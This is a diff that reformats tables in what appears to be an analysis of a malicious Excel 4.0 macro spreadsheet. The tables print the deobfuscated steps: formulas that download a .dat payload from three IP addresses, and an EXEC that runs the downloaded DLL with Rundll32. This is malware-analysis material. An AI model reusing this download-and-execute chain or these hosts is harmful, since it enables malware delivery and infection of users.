@@ -306,7 +306,7 @@ It's represented as the decimal number of days since 1 January 1900.
 
 | Sheet | Address | Value | Evaluated |
 |--|--|--|--|
-|sheet1|AO262|NOW()&".dat"|44276.7967810764.dat|
+|sheet1|AO262|NOW() &".dat"|44276.7967810764.dat|
 
 #### Payload acquired :dart:
 
@@ -315,11 +315,11 @@ Replacing the cell references reveals those URLs:
 
 | Sheet | Address | Simplified Value |
 |--|--|--|
-|sheet1|AO272|HERTY(0,"http://188.127.235.244/44276.7967810764.dat","..\Kiod.hod",0,0)|
-|sheet1|AO273|HERTY(0,"http://193.38.54.244/44276.7967810764.dat","..\Kiod.hod1",0,0)|
-|sheet1|AO274|HERTY(0,"http://185.82.217.213/44276.7967810764.dat","..\Kiod.hod2",0,0)|
-|sheet1|AO275|HERTY(0,"http://44276.7967810764.dat","..\Kiod.hod3",0,0)|
-|sheet1|AO276|HERTY(0,"http://44276.7967810764.dat","..\Kiod.hod4",0,0)|
+|sheet1|AO272|HERTY(0,"http://188.127.235.244/44276.7967810764.dat", "..\Kiod.hod", 0, 0)|
+|sheet1|AO273|HERTY(0,"http://193.38.54.244/44276.7967810764.dat", "..\Kiod.hod1", 0, 0)|
+|sheet1|AO274|HERTY(0,"http://185.82.217.213/44276.7967810764.dat", "..\Kiod.hod2", 0, 0)|
+|sheet1|AO275|HERTY(0,"http://44276.7967810764.dat", "..\Kiod.hod3", 0, 0)|
+|sheet1|AO276|HERTY(0,"http://44276.7967810764.dat", "..\Kiod.hod4", 0, 0)|
 
 Only the first three are valid URLs.
 I tried downloading the files through [Tor](https://en.wikipedia.org/wiki/Tor_%28anonymity_network%29)
@@ -335,11 +335,11 @@ That way, the attacker can hit some victims but avoid proper detection by malwar
 AO263 through AO265 use the macro-only function FORMULA.FILL.
 It is a niche Excel antipattern; regular functions only read values from other cells, but this one can write to a target cell.
 
-| Sheet | Original Address | Value | Destination Address | Evaluated |
+| Sheet | Original Address | Value | Evaluated |
 |--|--|--|--|--|
-|sheet1|AO263|FORMULA.FILL("..\Kiod.hod",AP263)|AP263|..\Kiod.hod|
-|sheet1|AO264|FORMULA.FILL(AL99&"undll32 ",AP264)|AP264|Rundll32 |
-|sheet1|AO265|FORMULA.FILL(","&AL101&AL113&AL113&AL99&AL114&"gisterServer",AP265)|AP265|,DllRegisterServer|
+|sheet1|AO263|FORMULA.FILL("..\Kiod.hod", AP263)|..\Kiod.hod|
+|sheet1|AO264|FORMULA.FILL(AL99 &"undll32 ", AP264)|Rundll32 |
+|sheet1|AO265|FORMULA.FILL("," &AL101 &AL113 &AL113 &AL99 &AL114 &"gisterServer", AP265)|,DllRegisterServer|
 
 This shed some light on the end goal. The payload is a [DLL](https://techterms.com/definition/dll) to be executed with
 [rundll32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32).
@@ -361,9 +361,9 @@ and can be safely removed when simplifying things:
 
 | Sheet | Address | Simplified Value | Evaluated |
 |--|--|--|--|
-|sheet2|X213|EXEC(sheet1!AP264&sheet1!AP263&sheet1!AP265)|EXEC("Rundll32 ..\Kiod.hod,DllRegisterServer")|
-|sheet2|X214|EXEC(sheet1!AP264&sheet1!AP263&"1"&sheet1!AP265)|EXEC("Rundll32 ..\Kiod.hod1,DllRegisterServer")|
-|sheet2|X215|EXEC(sheet1!AP264&sheet1!AP263&"2"&sheet1!AP265)|EXEC("Rundll32 ..\Kiod.hod2,DllRegisterServer")|
+|sheet2|X213|EXEC(sheet1!AP264 &sheet1!AP263 &sheet1!AP265)|EXEC("Rundll32 ..\Kiod.hod,DllRegisterServer")|
+|sheet2|X214|EXEC(sheet1!AP264 &sheet1!AP263 &"1"&sheet1!AP265)|EXEC("Rundll32 ..\Kiod.hod1,DllRegisterServer")|
+|sheet2|X215|EXEC(sheet1!AP264 &sheet1!AP263 &"2"&sheet1!AP265)|EXEC("Rundll32 ..\Kiod.hod2,DllRegisterServer")|
 
 So one or more copies of the attacker's DLLs would run and the Excel worksheet would have served its purpose.
 
